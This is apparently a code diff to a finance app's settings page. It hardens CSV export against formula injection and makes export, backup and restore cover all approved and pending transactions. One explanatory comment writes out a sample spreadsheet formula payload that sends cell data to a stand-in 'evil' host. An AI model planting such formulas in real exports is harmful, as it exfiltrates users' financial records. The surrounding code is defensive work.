@@ -11,12 +11,12 @@ import {
   deleteMerchantRule,
   saveMerchantRule,
   saveMerchantSetting,
-  getTransactions,
   supabase,
   getMerchantRulesFromDB,
   saveMerchantRuleToDb,
   migrateLocalStorageRulesToDB
 } from '@/services'
+import { fetchAllTransactions } from '@/services/transactions'
 import { getInsurancePolicies, createInsurancePolicy, deleteInsurancePolicy } from '@/services/insurance'
 import { encryptText, decryptText, cn, formatCurrency, formatDate } from '@/utils'
 import { useAuth } from '@/context/AuthContext'
@@ -139,10 +139,31 @@ export default function SettingsPage() {
   const [showRestoreConfirmModal, setShowRestoreConfirmModal] = useState(false)
   const [pendingRestoreData, setPendingRestoreData] = useState<any[] | null>(null)
 
+  /**
+   * Escape one value for a CSV cell.
+   *
+   * Beyond the usual double-quote doubling, this defuses CSV formula
+   * injection. Merchant and description text arrives from scanned emails, and
+   * anyone who knows the user's address can send them one — a merchant named
+   * `=HYPERLINK("http://evil/?d="&A1,"Receipt")` is a live formula the moment
+   * the exported file is opened in Excel or Sheets, exfiltrating the row it
+   * sits next to. Excel treats a cell starting with = + - @ TAB or CR as a
+   * formula regardless of the surrounding quotes, so the standard mitigation
+   * is to push a leading apostrophe in front, which forces the cell to text.
+   */
+  const csvCell = (value: unknown) => {
+    const raw = value === null || value === undefined ? '' : String(value)
+    const defused = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
+    return `"${defused.replace(/"/g, '""')}"`
+  }
+
   const handlePlainExport = async (format: 'csv' | 'json') => {
     setExportLoading(true)
     try {
-      const { data: txns } = await getTransactions()
+      // Pending transactions are included: an export that silently omits
+      // everything still awaiting review is not the "all your data" the
+      // Data Portability card promises.
+      const { data: txns } = await fetchAllTransactions({ statuses: ['approved', 'pending'] })
       if (!txns || txns.length === 0) {
         showToast('No transaction records found to export.', 'warning')
         return
@@ -154,8 +175,25 @@ export default function SettingsPage() {
 
       if (format === 'csv') {
         const headers = 'ID,Date,Type,Amount,Category,Merchant,Description,Payment Mode,Card Last 4,Issuer,Confidence,Event Type,Source,Status\n'
-        const rows = txns.map(t => 
-          `"${t.id}","${t.date}","${t.type}",${t.amount},"${t.category}","${(t.merchant || '').replace(/"/g, '""')}","${(t.description || '').replace(/"/g, '""')}","${t.payment_mode || 'unknown'}","${t.card_last4 || ''}","${t.card_issuer || ''}",${t.confidence_score || ''},"${t.event_type || ''}","${t.source}","${t.approval_status}"`
+        const rows = txns.map(t =>
+          [
+            csvCell(t.id),
+            csvCell(t.date),
+            csvCell(t.type),
+            // Amount and confidence are numeric columns; they stay unquoted so
+            // spreadsheets keep treating them as numbers rather than text.
+            t.amount,
+            csvCell(t.category),
+            csvCell(t.merchant || ''),
+            csvCell(t.description || ''),
+            csvCell(t.payment_mode || 'unknown'),
+            csvCell(t.card_last4 || ''),
+            csvCell(t.card_issuer || ''),
+            t.confidence_score || '',
+            csvCell(t.event_type || ''),
+            csvCell(t.source),
+            csvCell(t.approval_status),
+          ].join(',')
         ).join('\n')
         content = headers + rows
         mimeType = 'text/csv;charset=utf-8;'
@@ -352,7 +390,10 @@ export default function SettingsPage() {
     setBackupLoading(true)
     setBackupSuccess(false)
     try {
-      const { data: txns } = await getTransactions()
+      // Every row, approved and pending alike. A backup that stops at the
+      // first page or drops the review queue is data loss the user only finds
+      // out about when they try to restore it.
+      const { data: txns } = await fetchAllTransactions({ statuses: ['approved', 'pending'] })
       if (!txns || txns.length === 0) {
         showToast('No transaction records found to export.', 'warning')
         setBackupLoading(false)
@@ -420,7 +461,16 @@ export default function SettingsPage() {
     if (!pendingRestoreData) return
     setRestoreLoading(true)
     try {
-      const { data: currentTxns } = await getTransactions()
+      // The dedup set has to cover the whole table. Built from a truncated
+      // first page it would miss older transactions and happily re-insert them
+      // as duplicates on every restore. Pending rows count too, since the
+      // backup now contains them.
+      const { data: currentTxns, error: currentErr } = await fetchAllTransactions({
+        statuses: ['approved', 'pending'],
+      })
+      if (currentErr) {
+        throw new Error('Could not read your existing transactions, so the merge was cancelled rather than risk creating duplicates.')
+      }
       const currentKeys = new Set(currentTxns?.map(t => `${t.date}-${t.amount}-${t.merchant || ''}-${t.description || ''}`))
 
       const toInsert = pendingRestoreData.filter((t: any) => {
@@ -646,7 +696,7 @@ export default function SettingsPage() {
                 <span>Privacy-First Encrypted Backup</span>
               </h2>
               <p className="text-xs text-zinc-400 mb-6 leading-relaxed">
-                Securely export or restore your transactions locally. All backups are encrypted client-side using industry-standard **AES-256-GCM** before downloading.
+                Securely export or restore your transactions locally. Every transaction is included — approved ones and anything still waiting in Pending. All backups are encrypted client-side using industry-standard **AES-256-GCM** before downloading.
               </p>
 
               <div className="space-y-6">
@@ -755,7 +805,7 @@ export default function SettingsPage() {
                 <span>Data Portability (Plain Export)</span>
               </h2>
               <p className="text-xs text-zinc-400 mb-4 leading-relaxed">
-                Export all your transaction history in standard, human-readable formats for tax filing, spreadsheets, or migrations.
+                Export your complete transaction history — approved and pending — in standard, human-readable formats for tax filing, spreadsheets, or migrations.
               </p>
               <div className="flex gap-3">
                 <Button
